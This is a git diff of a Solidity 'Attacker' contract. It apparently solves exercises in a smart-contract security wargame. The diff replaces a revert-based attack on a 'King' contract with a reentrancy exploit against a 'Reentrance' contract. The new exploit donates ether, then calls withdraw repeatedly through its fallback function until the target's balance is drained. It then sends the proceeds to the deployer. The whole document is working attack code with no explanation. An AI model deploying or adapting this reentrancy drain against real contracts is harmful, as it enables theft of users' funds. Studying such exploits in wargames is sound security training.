@@ -7,18 +7,30 @@ contract Attacker {
 
   address payable target;
   address public deployer;
+  uint val;
 
-  constructor (address payable _target) public payable {
+  constructor (address payable _target) public {
     target = _target;
     deployer = msg.sender;
   }
 
   function attack() public {
-    uint prize = King(target).prize();
-    target.call{value: prize}("");
+    Reentrance t = Reentrance(target);
+    t.withdraw(val);
     }
 
-  receive() external payable {
-    revert();
+  function donate() public payable {
+    Reentrance t = Reentrance(target);
+    t.donate{value: msg.value}(address(this));
+    val = msg.value;
+    }
+
+  fallback() external payable {
+    if (target.balance >= val) {attack();}
+    else {
+      Reentrance t = Reentrance(target);
+      t.withdraw(target.balance);
+      deployer.call.value(address(this).balance)("");
+    }
   }
 }
